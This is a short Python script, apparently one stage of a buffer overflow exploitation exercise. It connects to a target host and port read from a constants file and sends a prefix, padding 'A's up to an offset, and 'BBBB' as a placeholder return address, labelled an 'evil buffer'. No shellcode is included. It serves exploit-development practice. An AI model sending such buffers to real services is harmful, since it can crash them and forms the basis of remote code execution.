#!/usr/bin/env python3

import socket
import constants

ip = constants.IP
port = constants.PORT
prefix = constants.PREFIX

offset = constants.OFFSET
overflow = "A" * offset
retn = "BBBB"

buffer = prefix + overflow + retn

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")